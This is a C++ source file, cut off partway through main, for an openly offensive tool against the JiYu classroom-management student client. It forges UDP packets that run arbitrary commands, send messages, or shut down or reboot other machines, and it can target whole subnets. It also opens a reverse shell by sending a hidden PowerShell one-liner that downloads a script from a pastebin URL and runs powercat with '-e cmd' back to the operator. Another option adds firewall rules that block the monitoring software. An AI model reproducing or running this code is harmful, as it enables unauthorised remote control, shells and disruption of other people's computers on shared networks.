#ifdef _WIN32

#include <winsock2.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <ctime>
#include <cstdio>
#include <string>
#include <cstring>
#include <vector>
#include <regex>
#include <algorithm>
#include <conio.h>
#include <iostream>

#ifdef _MSC_VER
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "user32.lib")
#pragma warning(disable: 4530)
#endif // _MSC_VER

class Logger {
    public:
        Logger(FILE* fp, int level = Warning);
        ~Logger();
        enum LogLevel {
            Debug = 1,
            Info,
            Warning,
            Error,
            Critical,
            None
        };
        static std::string getTime();
        void setLevel(int level);
        int getLevel();
        template<typename... Args>
        void log(int level, std::string content, Args... args);

    private:
        FILE* fp;
        int curLevel = Warning;
};

int strToInt(std::string str);

std::vector<BYTE> formatANSIString(const std::string str);

std::vector<DWORD> getProcessIdByName(const std::string& processName);

std::string IPDwordToString(DWORD ip);

struct ParamOpt {
    std::string id;
    char opt;
    std::string longopt;
    bool withParam;
    std::string defaultValue;
};

struct ParamRet {
    std::string id = "";
    bool exists = false;
    std::string value = "";
};

std::vector<ParamRet> GetParams(int argc, char *argv[], std::vector<ParamOpt> opts);
ParamRet GetParamfromParams(std::string id, std::vector<ParamRet> rets);

struct StudentPort {
    int pid;
    std::string ip;
    int port;
};

class ISocket {
    public:
        ISocket(Logger* logger);
        ~ISocket();
        std::string localIP = "";
        std::vector<std::string> getLocalIPs();
        std::vector<StudentPort> getStudentPorts();
        int send(std::string IP, int port, std::vector<BYTE> data);
    private:
        WSADATA wsd;
        int optval = 1;
        SOCKET client;
        Logger* logger;
};

class JiYu_Attack {
    public:
        JiYu_Attack();
        static const std::vector<BYTE> cmdCodePrefix[4];
        static const int cmdContentBegin[2];
        enum cmdType {
            MSG = 0,
            CMD,
            REBOOT,
            SHUTDOWN
        };
        static const std::string nc_ps_url;
        ISocket* client;
        std::vector<std::string> IPParser(std::string rawIP);
        int sendCmd(std::string rawIP, int port, std::string cmd);
        int sendMsg(std::string rawIP, int port, std::string msg);
        int sendShutdown(std::string rawIP, int port);
        int sendReboot(std::string rawIP, int port);
        int netcat(std::string IP, int port, int ncport);
        int breakScreenControl();
        int continueScreenControl();
    
    private:
        Logger* logger;
        int sendPkg(std::string rawIP, int port, std::vector<BYTE> data);
};

struct NetcatInfo {
    JiYu_Attack* jyAtk;
    std::string IP;
    int port;
    int ncport;
};

DWORD WINAPI netcat_remote(LPVOID lpParameter);

Logger::Logger(FILE* fp, int level) : fp(fp) {
    if(level >= Debug && level <= None) this->curLevel = level;
    this->log(Info, "Logger initialized.");
};

Logger::~Logger() {
    fclose(fp);
}

std::string Logger::getTime() {
    time_t rawtime;
    time(&rawtime);
    char tmstr[9];
    strftime(tmstr, 9, "%H:%M:%S", localtime(&rawtime));
    return tmstr;
}

int Logger::getLevel() {
    return curLevel;
}

void Logger::setLevel(int level) {
    if(level >= Debug && level <= None) curLevel = level;
}

template<typename... Args>
void Logger::log(int level, std::string content, Args... args) {
    if(level < curLevel || level >= None) return;
    std::string levelStr;
    if(level == Debug) levelStr = "DEBUG";
    else if(level == Info) levelStr = "INFO";
    else if(level == Warning) levelStr = "WARNING";
    else if(level == Error) levelStr = "ERROR";
    else if(level == Critical) levelStr = "CRITICAL";
    fprintf(fp, ("[" + getTime() + "|" + levelStr + "] " + content + "\n").c_str(), args...);
}

int strToInt(std::string str) {
    int ret = 0;
    for(auto i: str) {
        ret = ret * 10 + i - '0';
    }
    return ret;
}

std::vector<BYTE> formatANSIString(const std::string str) {
    int num = MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, NULL, 0);
    wchar_t *wide = new wchar_t[num];
    MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, wide, num);
    std::vector<BYTE> ret((num - 1) * sizeof(wchar_t));
    memcpy(&ret[0], wide, (num - 1) * sizeof(wchar_t));
    return ret;
}

std::vector<DWORD> getProcessIdByName(const std::string& processName) {
    std::vector<DWORD> pid;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry)) {
        do {
            if (processName == entry.szExeFile) {
                pid.push_back(entry.th32ProcessID);
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return pid;
}

std::string IPDwordToString(DWORD ip) {
    WORD hiWord=HIWORD(ip);
    WORD loWord=LOWORD(ip);
    char ret[20];
    sprintf(ret, "%d.%d.%d.%d", LOBYTE(loWord), HIBYTE(loWord), LOBYTE(hiWord), HIBYTE(hiWord));
    return ret;
}

std::vector<ParamRet> GetParams(int argc, char *argv[], std::vector<ParamOpt> opts) {
    std::vector<ParamRet> rets;
    for(auto opt: opts) {
        ParamRet ret;
        ret.id = opt.id;
        for(int i = 1; i < argc; i++) {
            if(argv[i][0] == '-') {
                if(
                    (opt.longopt != "" && argv[i][1] == '-' && argv[i] == "--" + opt.longopt) ||
                    (argv[i][1] == opt.opt && argv[i][2] == '\0')
                ) {
                    ret.exists = true;
                    if(opt.withParam && i < argc - 1) {
                        i++;
                        if(argv[i][0] != '-') {
                            ret.value = argv[i];
                        }
                        else ret.value = opt.defaultValue;
                    }
                    else ret.value = opt.defaultValue;
                    break;
                }
            }
        }
        if(!ret.exists && opt.withParam && opt.defaultValue != "") ret.value = opt.defaultValue;
        rets.push_back(ret);
    }
    return rets;
}

ParamRet GetParamfromParams(std::string id, std::vector<ParamRet> rets) {
    for(auto ret: rets) {
        if(ret.id == id) {
            return ret;
        }
    }
    return ParamRet();
}

ISocket::ISocket(Logger* logger): logger(logger) {
    logger->log(Logger::Info, "Initializing ISocket...");
    if(WSAStartup(MAKEWORD(2, 2), &wsd) != 0) {
        logger->log(Logger::Error, "执行 WSAStartup 失败。");
        return;
    }

    client = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(client <= 0) {
        logger->log(Logger::Error, "Socket 客户端启动失败。");
        return;
    }
    setsockopt(client, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(int));

    auto localIPs = getLocalIPs();
    auto studentPorts = getStudentPorts();
    for(auto port: studentPorts) {
        if(std::find(localIPs.begin(), localIPs.end(), port.ip) != localIPs.end()) {
            localIP = port.ip;
            break;
        }
    }
    if(localIP == ""){
        logger->log(Logger::Warning, "未能获取学生端监听端口对应的 IP，尝试使用其它本机 IP 代替……");
        if(localIPs.size()) localIP = localIPs[0];
        else logger->log(Logger::Warning, "未能获取合适的 IP。");
    }
    logger->log(Logger::Info, "ISocket initialized.");
}

ISocket::~ISocket() {
    WSACleanup();
}

std::vector<std::string> ISocket::getLocalIPs() {
    char host[100] ={0};
    std::vector<std::string> ret;

    if(gethostname(host, sizeof(host)) == SOCKET_ERROR) {
        logger->log(Logger::Error, "执行 gethostname 失败。");
        return ret;
    }

    struct hostent *hp;
    if((hp = gethostbyname(host)) == NULL) {
        logger->log(Logger::Error, "执行 gethostbyname 失败。");
        return ret;
    }

    for(int i = 0; hp -> h_addr_list[i] != NULL; i++) {
        ret.push_back(inet_ntoa(*(struct in_addr*)hp->h_addr_list[i]));
    }
    return ret;
}

std::vector<StudentPort> ISocket::getStudentPorts() {
    std::vector<StudentPort> ret;
    auto studentMainPid = getProcessIdByName("StudentMain.exe");
    if(studentMainPid.empty()) {
        logger->log(Logger::Warning, "进程 StudentMain.exe 未找到。返回空结果。");
        return ret;
    }
    logger->log(Logger::Info, "Getting %d Student Terminal pid(s)...", (int)studentMainPid.size());
    DWORD dwBufferSize = 0;
    GetExtendedUdpTable(NULL, &dwBufferSize, true, AF_INET, UDP_TABLE_OWNER_PID, 0);
    MIB_UDPTABLE_OWNER_PID *pMibUdpTable = (MIB_UDPTABLE_OWNER_PID*)malloc(dwBufferSize);
    DWORD dwRet = GetExtendedUdpTable(pMibUdpTable, &dwBufferSize, true, AF_INET, UDP_TABLE_OWNER_PID, 0);
    if(dwRet != NO_ERROR) {
        logger->log(Logger::Error, "获取 UDP 端口列表失败。错误码：%lu", dwRet);
        return ret;
    }
    for(int i = 0; i < (int)pMibUdpTable->dwNumEntries; i++) {
        if(std::find(
            studentMainPid.begin(),
            studentMainPid.end(),
            pMibUdpTable->table[i].dwOwningPid
        ) != studentMainPid.end()) {
            ret.push_back({
                (int)pMibUdpTable->table[i].dwOwningPid,
                IPDwordToString(pMibUdpTable->table[i].dwLocalAddr),
                ntohs(pMibUdpTable->table[i].dwLocalPort)
            });
        }
    }
    return ret;
}

int ISocket::send(std::string IP, int port, std::vector<BYTE> data) {
    SOCKADDR_IN dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    dest_addr.sin_addr.s_addr = inet_addr(IP.c_str());

    int sendRes;
    sendRes = sendto(client, (const char*)&data[0], data.size(), 0, (sockaddr*)&dest_addr, sizeof(sockaddr));
    if(sendRes == -1) {
        logger->log(Logger::Error, "发送失败。函数 sendto 出现问题。");
        return 1;
    }
    return 0;
}

JiYu_Attack::JiYu_Attack() {
    logger = new Logger(stdout, Logger::Error);
    client = new ISocket(logger);
    logger->log(Logger::Info, "JiYu_Attack initialized.");
}

const std::vector<BYTE> JiYu_Attack::cmdCodePrefix[4] = {
    std::vector<BYTE>{
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x9e, 0x03, 0x00, 0x00, 0x10, 0x41, 0xaf, 0xfb,
        0xa0, 0xe7, 0x52, 0x40, 0x91, 0xdc, 0x27, 0xa3, 0xb6, 0xf9, 0x29, 0x2e, 0x20, 0x4e, 0x00, 0x00,
        0xc0, 0xa8, 0x50, 0x81, 0x91, 0x03, 0x00, 0x00, 0x91, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x05,
    }, std::vector<BYTE>{
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x6e, 0x03, 0x00, 0x00, 0x5b, 0x68, 0x2b, 0x25,
        0x6f, 0x61, 0x64, 0x4d, 0xa7, 0x92, 0xf0, 0x47, 0x00, 0xc5, 0xa4, 0x0e, 0x20, 0x4e, 0x00, 0x00,
        0xc0, 0xa8, 0x64, 0x86, 0x61, 0x03, 0x00, 0x00, 0x61, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x43, 0x00, 0x3a, 0x00,
        0x5c, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00,
        0x5c, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6d, 0x00, 0x33, 0x00,
        0x32, 0x00, 0x5c, 0x00, 0x63, 0x00, 0x6d, 0x00, 0x64, 0x00, 0x2e, 0x00, 0x65, 0x00, 0x78,
    }, std::vector<BYTE>{
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x2a, 0x02, 0x00, 0x00, 0xbf, 0x40, 0x22, 0x4e,
        0x57, 0x2d, 0x3e, 0x4f, 0x9b, 0x6f, 0xc1, 0x8d, 0xe1, 0xeb, 0x4f, 0x62, 0x20, 0x4e, 0x00, 0x00,
        0xc0, 0xa8, 0x50, 0x81, 0x1d, 0x02, 0x00, 0x00, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x13, 0x00, 0x00, 0x10, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e, 0x06, 0x5c, 0xcd, 0x91, 0x2f, 0x54, 0xa8, 0x60,
        0x84, 0x76, 0xa1, 0x8b, 0x97, 0x7b, 0x3a, 0x67, 0x02, 0x30,
    }, std::vector<BYTE>{
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x2a, 0x02, 0x00, 0x00, 0xc8, 0xe3, 0x97, 0xfd,
        0xc0, 0xb5, 0x9f, 0x45, 0x87, 0x72, 0x05, 0xbd, 0x4e, 0x46, 0xa8, 0x96, 0x20, 0x4e, 0x00, 0x00,
        0xc0, 0xa8, 0x50, 0x81, 0x1d, 0x02, 0x00, 0x00, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x10, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e, 0x06, 0x5c, 0x73, 0x51, 0xed, 0x95, 0xa8, 0x60,
        0x84, 0x76, 0xa1, 0x8b, 0x97, 0x7b, 0x3a, 0x67, 0x02, 0x30,
    },
};

const int JiYu_Attack::cmdContentBegin[2] = {56, 578};

const std::string JiYu_Attack::nc_ps_url = "https://pastebin.com/raw/u7zARPaN";

std::vector<std::string> JiYu_Attack::IPParser(std::string rawIP) {
    std::vector<std::string> ret;
    std::regex pattern("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))$");
    if(std::regex_match(rawIP, pattern)) {
        logger->log(Logger::Info, "IP parsed. Type: origin.");
        ret.push_back(rawIP);
        return ret;
    }
    pattern = std::regex("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))-(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))$");
    if(std::regex_match(rawIP, pattern)) {
        logger->log(Logger::Info, "IP parsed. Type: '-' segment.");
        std::string segPrefix = rawIP.substr(0, rawIP.rfind('.') + 1);
        std::string lStr = rawIP.substr(rawIP.rfind('.') + 1, rawIP.find('-') - rawIP.rfind('.') - 1);
        std::string rStr = rawIP.substr(rawIP.find('-') + 1);
        int l = strToInt(lStr), r = strToInt(rStr);
        for(int i = l; i <= r; i++) {
            ret.push_back(segPrefix + std::to_string(i));
        }
        return ret;
    }
    pattern = std::regex("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-5]))/24$");
    if(std::regex_match(rawIP, pattern)) {
        logger->log(Logger::Info, "IP parsed. Type: class C.");
        std::string segPrefix = rawIP.substr(0, rawIP.rfind('.') + 1);
        for(int i = 1; i < 255; i++) {
            ret.push_back(segPrefix + std::to_string(i));
        }
        return ret;
    }
    logger->log(Logger::Error, "非法的 IP 地址格式。");
    return ret;
}

int JiYu_Attack::sendCmd(std::string rawIP, int port, std::string cmd) {
    auto data = cmdCodePrefix[CMD];
    data.resize(897);
    data[572] = 0x2f; data[574] = 0x63; data[576] = 0x20;
    data[892] = 0x01; data[896] = 0x01; data[112] = 0x65;
    auto formatted = formatANSIString(cmd);
    data.resize((std::max)(data.size(), formatted.size() + cmdContentBegin[CMD]));
    for(int i = 0; i < (int)formatted.size(); i++) {
        data[i + cmdContentBegin[CMD]] = formatted[i];
    }
    return sendPkg(rawIP, port, data);
}

int JiYu_Attack::sendMsg(std::string rawIP, int port, std::string msg) {
    auto data = cmdCodePrefix[MSG];
    auto formatted = formatANSIString(msg);
    data.resize((std::max)(data.size(), formatted.size() + cmdContentBegin[MSG]));
    for(int i = 0; i < (int)formatted.size(); i++) {
        data[i + cmdContentBegin[MSG]] = formatted[i];
    }
    return sendPkg(rawIP, port, data);
}

int JiYu_Attack::sendShutdown(std::string rawIP, int port) {
    return sendPkg(rawIP, port, cmdCodePrefix[SHUTDOWN]);
}

int JiYu_Attack::sendReboot(std::string rawIP, int port) {
    return sendPkg(rawIP, port, cmdCodePrefix[REBOOT]);
}

DWORD WINAPI netcat_remote(LPVOID lpParameter) {
    NetcatInfo ncInfo = *(NetcatInfo*)lpParameter;
    return ncInfo.jyAtk->sendCmd(
        ncInfo.IP,
        ncInfo.port,
        "powershell -WindowStyle Hidden IEX (New-Object System.Net.Webclient).DownloadString('" + JiYu_Attack::nc_ps_url +
        "');powercat -c " + ncInfo.jyAtk->client->localIP + " -p " + std::to_string(ncInfo.ncport) + " -e cmd"
    );
}

int JiYu_Attack::netcat(std::string IP, int port, int ncport) {
    std::regex pattern("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))$");
    if(!std::regex_match(IP, pattern)) {
        return 4;
    }
    NetcatInfo ncInfo = {this, IP, port, ncport};
    HANDLE hThread = CreateThread(NULL, 0, netcat_remote, &ncInfo, 0, NULL);
    printf("正在监听 %d 端口的 netcat……\n", ncport);
    system((
        "powershell IEX (New-Object System.Net.Webclient).DownloadString('" + nc_ps_url +
        "');powercat -l -p " + std::to_string(ncport)
    ).c_str());
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return 0;
}

int JiYu_Attack::breakScreenControl() {
    if(system("net session >nul 2>&1")) {
        logger->log(Logger::Error, "需要管理员权限。");
        return 3;
    }
    system("sc config MpsSvc start=auto >nul 2>&1");
    system("net start MpsSvc >nul 2>&1");
    system("netsh advfirewall set allprofiles state on >nul 2>&1");
    system("netsh advfirewall firewall delete rule name=\"StudentMain.exe\" >nul 2>&1");
    system("netsh advfirewall firewall add rule name=\"StudentMain.exe\" dir=in action=block >nul 2>&1");
    return 0;
}

int JiYu_Attack::continueScreenControl() {
    if(system("net session >nul 2>&1")) {
        logger->log(Logger::Error, "需要管理员权限。");
        return 3;
    }
    system("netsh advfirewall firewall delete rule name=\"StudentMain.exe\" >nul 2>&1");
    system("netsh advfirewall firewall add rule name=\"StudentMain.exe\" dir=in action=allow >nul 2>&1");
    return 0;
}

int JiYu_Attack::sendPkg(std::string rawIP, int port, std::vector<BYTE> data) {
    data[12] = rand() % 256;
    data.resize((std::max)((int)data.size(), 1024));
    auto IPs = IPParser(rawIP);
    if(IPs.empty()) return 4;
    logger->log(Logger::Info, "Sending data package with %d bytes to raw IP %s parsed into %d IPs...", (int)data.size(), rawIP.c_str(), (int)IPs.size());
    int ret = 0;
    for(auto IP: IPs) {
        ret |= client->send(IP, port, data);
    }
    return ret;
}

bool isValidPort(int port) {
    return port > 0 && port < 65536;
}

template<typename... Args>
void loopSend(int loopCount, int loopInterval, JiYu_Attack *tmpJyAtk, int (JiYu_Attack::*sendFunction)(Args... args), Args... args) {
    for(int i = 1; i <= loopCount; i++) {
        if(i > 1) Sleep(loopInterval * 1000);
        if((tmpJyAtk->*sendFunction)(args...)) {
            printf("发送失败。\n");
            return;
        }
        if(loopCount > 1) {
            printf("第 %d 次发送完毕。\n", i);
        }
    }
    printf("发送完毕。\n");
}

std::istream& getCleanedLine(std::string &str, bool clean = true) {
    auto& ret = std::getline(std::cin, str);
    if(!clean) return ret;
    int first_print_pos = 0;
    while(first_print_pos < (int)str.size() && isspace(str[first_print_pos])) first_print_pos++;
    str.erase(0, first_print_pos);
    while(str.size() && isspace(str.back())) str.pop_back();
    return ret;
}

DWORD WINAPI runSystemVer(LPVOID lpParameter) {
    (void)(lpParameter);
    char ps[1024] = "Ver", buf_ps[1024] = {};
    auto ptr = _popen(ps, "r");
    bool ret = 1;
    if(ptr != NULL) {
        while(fgets(buf_ps, 1024, ptr) != NULL);
        ret = _pclose(ptr);
        ptr = NULL;
    }
    return ret;
}

void pressEscape() {
    HWND hwnd;
    char pszNewWindowTitle[1024];
    char pszOldWindowTitle[1024];
    GetConsoleTitle(pszOldWindowTitle, 1024);
    wsprintf(pszNewWindowTitle, "Pressing escape to stop pausing... %d/%d", GetTickCount(), GetCurrentProcessId());
    SetConsoleTitle(pszNewWindowTitle);
    Sleep(100);
    hwnd = FindWindow(NULL, pszNewWindowTitle);
    SetConsoleTitle(pszOldWindowTitle);
    if(hwnd) {
        WORD dwScanCode = MapVirtualKey(VK_ESCAPE, MAPVK_VK_TO_VSC);
        DWORD dwVKFkeyData = 1 | dwScanCode << 16 | 0 << 24 | 1 << 29;
        SendMessage(hwnd, WM_KEYDOWN, VK_ESCAPE, dwVKFkeyData);
        SendMessage(hwnd, WM_CHAR, VK_ESCAPE, dwVKFkeyData);
        SendMessage(hwnd, WM_KEYUP, VK_ESCAPE, dwVKFkeyData | 3 << 30);
        return;
    }
    keybd_event(VK_ESCAPE, 0, 0, 0);
    keybd_event(VK_ESCAPE, 0, KEYEVENTF_KEYUP, 0);
}

bool checkCMDAvailability() {
    HANDLE hThread = CreateThread(NULL, 0, runSystemVer, NULL, 0, NULL);
    Sleep(100);
    DWORD exitCode;
    GetExitCodeThread(hThread, &exitCode);
    if(exitCode == STILL_ACTIVE) pressEscape();
    WaitForSingleObject(hThread, 100);
    CloseHandle(hThread);
    return !exitCode;
}

auto jyAtk = new JiYu_Attack;

void startUI() {
    bool isCMDAvailable = checkCMDAvailability();

    printf("------------------- GitHub Repository -------------------\n    https://github.com/pbw-Kevin/Jiyu-UDP-Attack-Cpp\n\nJiyu UDP Attack Cpp 用户界面\n输入指令以继续。输入 help 以获取帮助。输入 exit 以退出。\n");

    if(!isCMDAvailable) {
        printf("警告：无法使用 CMD 命令行。某些功能可能无法使用。\n");
    }

    std::string opt, IP;
    int port = 4705, ncport = 8888, loopCount = 1, loopInterval = 22;
    bool isEmptyLine = false;
    while(printf(isEmptyLine ? ">>> " : "\n>>> "), getCleanedLine(opt)) {
        if(opt == "") {
            isEmptyLine = true;
            continue;
        }
        else isEmptyLine = false;
        std::string tmpStr;
        if(opt == "exit") {
            break;
        }
        else if(opt == "h" || opt == "help") {
            printf("\n使用方法：\n先配置信息，然后执行。信息会存储，可以反复使用。\n\n用于退出的命令：\n  exit\n\n用于配置信息的命令：\n  i(ip)     指定目标机的 IP。\n  p         指定监听的端口。默认值为 4705。\n  l         指定命令的循环次数。默认值为 1。\n  t         指定两次循环之间的时间间隔，单位为秒。默认值为 22。\n  n(ncport) 指定 nc 命令的监听端口。默认值为 8888。\n\n用于执行的命令：\n  h(help) 显示帮助文本。\n  config  显示当前的配置信息。\n  m(msg)  发送信息。\n  c       在目标机上运行指定命令。\n  e       加载额外选项。\n\ne 命令的额外选项：\n  r        重启目标机。\n  s        关闭目标机。\n  g        获取当前的 IP 地址和学生端监听的端口。\n  nc       反弹 Shell。目标机需要能访问互联网。在退出时可使用 exit 命令。\n  break    脱离屏幕控制。需要以管理员身份运行程序。\n  continue 恢复屏幕控制。\n");
        }
        else if(opt  == "config") {
            printf("指定的 IP 地址：%s\n", IP.size() ? IP.c_str() : "未指定");
            printf("指定的监听端口：%d\n", port);
            printf("指定的 netcat 监听端口：%d\n", ncport);
            printf("指定的命令循环次数：%d\n", loopCount);
            printf("指定的两次循环之间的时间间隔，单位为秒：%d\n", loopInterval);
        }
        else if(opt == "m" || opt == "msg" || opt == "c") {
            if(IP == "") {
                printf("缺少 IP。\n");
                continue;
            }
            printf(opt == "c" ? "输入指令内容：\n" : "输入消息内容：\n");
            getCleanedLine(tmpStr, false);
            loopSend(loopCount, loopInterval, jyAtk, opt == "c" ? &JiYu_Attack::sendCmd : &JiYu_Attack::sendMsg, IP, port, tmpStr);
        }
        else if(opt == "i" || opt == "ip") {
            printf("输入目标机的 IP：");
            getCleanedLine(tmpStr);
            if(jyAtk->IPParser(tmpStr).empty()) {
                printf("设置失败。\n");
            }
            else {
                IP = tmpStr;
                printf("设置完成。\n");
            }
        }
        else if(opt == "p" || opt == "port" || opt == "n" || opt == "ncport" || opt == "l" || opt == "t") {
            switch (opt[0]) {
                case 'p': printf("输入学生端的端口号："); break;
                case 'n': printf("输入 netcat 监听的端口号："); break;
                case 'l': printf("输入命令的循环次数："); break;
                case 't': printf("输入两次循环之间的时间间隔，单位为秒："); break;
            }
            getCleanedLine(tmpStr);
            bool hasError = false;
            for(auto c: tmpStr) {
                if(!isdigit(c)) {
                    printf("不是一个非负整数。设置失败。\n");
                    hasError = true;
                    break;
                }
            }
            if(hasError) {
                continue;
            }
            if(tmpStr.size() > 9) {
                printf("数字过大。设置失败。\n");
                continue;
            }
            if(tmpStr.empty()) {
                printf("数字为空。设置失败。\n");
                continue;
            }
            int val = strToInt(tmpStr);
            if(opt == "l" || opt == "t") {
                if(opt == "l")loopCount = val;
                else loopInterval = val;
                printf("设置完成。\n");
                continue;
            }
            if(!isValidPort(val)) {
                printf("非法的端口号。设置失败。\n");
                continue;
            }
            if(opt == "p" || opt == "port") port = val;
            else if(opt == "n" || opt == "ncport") ncport = val;
            printf("设置完成。\n");
        }
        else if(opt != "e") {
            printf("未知的命令。请输入 help 以获取帮助。\n");
            continue;
        }
        if(opt != "e") continue;
        std::string extraOpt;
        printf("输入额外选项：");
        getCleanedLine(extraOpt);
        if(extraOpt == "g") {
            auto localIPs = jyAtk->client->getLocalIPs();
            printf("你的本地 IP 地址：");
            if(localIPs.size()) {
                putchar('\n');
                for(auto i: localIPs) {
                    printf("%s\n", i.c_str());
                }
                auto studentPorts = jyAtk->client->getStudentPorts();
                std::vector<int> ports;
                for(auto port: studentPorts) {
                    if(std::find(localIPs.begin(), localIPs.end(), port.ip) != localIPs.end()) {
                        ports.push_back(port.port);
                    }
                }
                printf("\n学生端监听的端口：");
                if(ports.size()) {
                    putchar('\n');
                    for(auto i: ports) {
                        printf("%d\n", i);
                    }
                }
                else {
                    printf("未找到\n");
                }
            }
            else {
                printf("未找到\n");
            }
        }
        else if(extraOpt == "break" || extraOpt == "continue") {
            if(!isCMDAvailable) {
                printf("无法使用 CMD 命令行，执行失败。\n");
            }
            else if((extraOpt == "break" ? jyAtk->breakScreenControl() : jyAtk->continueScreenControl()) == 3) {
                printf("需要管理员权限。\n");
            }
            else printf(extraOpt == "break" ? "已退出屏幕控制。\n" : "已恢复屏幕控制。\n");
        }
        else if(extraOpt == "r" || extraOpt == "s") {
            if(IP == "") {
                printf("缺少 IP。\n");
                continue;
            }
            loopSend(loopCount, loopInterval, jyAtk, extraOpt == "r" ? &JiYu_Attack::sendReboot : &JiYu_Attack::sendShutdown, IP, port);
        }
        else if(extraOpt == "nc") {
            if(!isCMDAvailable) {
                printf("无法使用 CMD 命令行，执行失败。\n");
                continue;
            }
            if(IP == "") {
                printf("缺少 IP。\n");
                continue;
            }
            if(jyAtk->netcat(IP, port, ncport)) {
                printf("\nNetcat 失败。\n");
            }
            else {
                printf("\nNetcat 已断开连接。\n如果未出现回显，代表未能连接到目标机，请检查 IP 地址和目标机的 Internet 连通性。\n如果出现“未能解析此远程名称”“远程服务器返回错误”等，且 Internet 连通性正常，代表存放脚本的链接失效，请联系 GitHub@pbw-Kevin。\n");
            }
        }
        else {
            printf("未知的额外选项。请输入 help 以获取帮助。\n");
        }
    }
    return;
}

int main(int argc, char *argv[]) {
    if(argc == 1) {
        startUI();
        return 0;
    }
    std::vector<ParamOpt> paramOpts = {
        {"help"  , 'h', "help"  , false, ""},
        {"ip"    , 'i', "ip"    , true , ""},
        {"port"  , 'p', "port"  , true , "4705"},
        {"msg"   , 'm', "msg"   , true , ""},
        {"cmd"   , 'c', ""      , true , ""},
        {"e"     , 'e', ""      , true , ""},
        {"l"     , 'l', ""      , true , "1"},
        {"t"     , 't', ""      , true , "22"},
        {"ncport", 'n', "ncport", true , "8888"},
    };
    auto paramRets = GetParams(argc, argv, paramOpts);
    if(GetParamfromParams("help", paramRets).exists) {
        printf("------------------- GitHub Repository -------------------\n    https://github.com/pbw-Kevin/Jiyu-UDP-Attack-Cpp\n\n使用方法：\n直接调用以唤起用户界面：\nmain\n\n通过命令行调用：\nmain [-h(--help) |\n  [-i(--i(--ip)) <IP>] [-p <Port>] [-m(--msg) <Message> | -c <Command>]\n  [-l <Loop Count>] [-t <Loop Time Interval>]\n  [-e <Extra Option>] [-n(--ncport) <NC Port>]]\n\n参数列表：\n  -h(--help)              显示帮助文本。\n  -i(--ip) <IP>           指定目标机的 IP。\n  -p <Port>               指定监听的端口。默认值为 4705。\n  -m(--msg) <Message>     指定要发送的信息。\n  -c <Command>            在目标机上运行指定命令。\n  -e <Extra Option>       加载额外选项。\n  -l <Loop Count>         指定命令的循环次数。默认值为 1。\n  -t <Loop Time Interval> 指定两次循环之间的时间间隔，单位为秒。默认值为 22。\n  -n(--ncport) <NC Port>  指定 nc 命令的监听端口。默认值为 8888。\n\n-e 参数的额外选项：\n  r        重启目标机。\n  s        关闭目标机。\n  g        获取当前的 IP 地址和学生端监听的端口。\n  nc       反弹 Shell。目标机需要能访问互联网。在退出时可使用 exit 命令。\n  break    脱离屏幕控制。需要以管理员身份运行程序。\n  continue 恢复屏幕控制。\n");
        return 0;
    }
    auto extraOpt = GetParamfromParams("e", paramRets);
    if(extraOpt.exists) {
        if(extraOpt.value == "g") {
            auto localIPs = jyAtk->client->getLocalIPs();
            printf("你的本地 IP 地址：");
            if(localIPs.size()) {
                putchar('\n');
                for(auto i: localIPs) {
                    printf("%s\n", i.c_str());
                }
            }
            else {
                printf("未找到\n");
                return 0;
            }
            auto studentPorts = jyAtk->client->getStudentPorts();
            std::vector<int> ports;
            for(auto port: studentPorts) {
                if(std::find(localIPs.begin(), localIPs.end(), port.ip) != localIPs.end()) {
                    ports.push_back(port.port);
                }
            }
            printf("\n学生端监听的端口：");
            if(ports.size()) {
                putchar('\n');
                for(auto i: ports) {
                    printf("%d\n", i);
                }
            }
